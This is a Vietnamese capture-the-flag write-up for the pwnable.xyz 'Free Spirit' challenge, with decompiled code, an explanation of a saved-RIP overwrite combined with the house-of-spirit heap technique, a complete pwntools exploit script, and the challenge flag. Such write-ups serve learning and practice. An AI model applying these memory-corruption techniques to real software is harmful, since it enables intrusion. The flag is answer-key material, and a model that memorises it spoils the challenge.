# Pwnable.xyz Free Spirit
## Analysis
```
undefined8 main(void)
{
  int choice;
  long lVar1;
  undefined4 *puVar2;
  long *in_FS_OFFSET;
  byte bVar3;
  void *heapPtr;
  undefined4 inp [12];
  long canary;
  
  bVar3 = 0;
  canary = in_FS_OFFSET[5];
  setup();
  heapPtr = malloc(0x40);
beginLoop:
  do {
    while( true ) {
      while( true ) {
        __printf_chk(1,&>);
        puVar2 = inp;
        for (lVar1 = 12; lVar1 != 0; lVar1 = lVar1 + -1) {
          *puVar2 = 0;
          puVar2 = puVar2 + (ulong)bVar3 * -2 + 1;
        }
        read(0,inp,0x30);
        choice = atoi((char *)inp);
        if (choice != 1) break;
        syscall();
      }
      if (1 < choice) break;
      if (choice == 0) {
        if (heapPtr == (void *)0x0) {
                    /* WARNING: Subroutine does not return */
          exit(1);
        }
        free(heapPtr);
        if (canary == in_FS_OFFSET[5]) {
          return 0;
        }
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
invalid:
      puts("Invalid");
    }
    if (choice == 2) {
      __printf_chk(1,&%p,&heapPtr);
      goto beginLoop;
    }
    if (choice != 3) goto invalid;
    if (limit < 2) {
      heapPtr = *(void **)((long)heapPtr + 8);
    }
  } while( true );
} 
```
Chương trình cho user 4 lựa chọn:
+ 0: free(heapPtr) và thoát chương trình
+ 1: gọi sys_read(0, heapPtr, 0x20)
+ 2: in ra &heapPtr
+ 3: heapPtr = heapPtr[1]
## Solution
Có &heapPtr -> có địa chỉ save rip -> ghi đè save rip bằng địa chỉ hàm win  
Để ret2win thành công thì free(heapPtr) trong option 0 cũng phải thành công -> sử dụng kỹ thuật house of spirit  
Chú ý tránh các lỗi alignment  
```
#!/usr/bin/python3
from pwn import *

context.binary = elf = ELF("./challenge", checksec = False)

con = process()
# gdb.attach(con, gdbscript = "b*0x4008bd")
# con = remote("svc.pwnable.xyz", 30005)

ret_gadget = 0x4008e1

def quit():
    con.sendafter(b"> ", b"0")

def option1(msg):
    con.sendafter(b"> ", b"1")
    con.send(msg)

def option2():
    con.sendafter(b"> ", b"2")
    return int(con.recvline().decode().strip("\n"), 16)

def option3():
    con.sendafter(b"> ", b"3")

if __name__ == '__main__':
    # input()
    ### Stage 1: ghi đè save rip
    leak = option2()
    log.info(hex(leak))
    rip = leak + 0x58

    option1(b"A"*8+p64(rip))
    option3()
    option1(p64(ret_gadget) + p64(leak + 0x60))

    ### Stage 2: house of spirit
    option3()
    option1(p64(elf.sym['win']) + p64(leak + 0x80) + p64(0) + p64(0x20))
    option3()
    option1(p64(0) + p64(0x20) + p64(0))
    quit()

    con.interactive()
```
## Flag
```
FLAG{I_promise_it_gets_better}
```
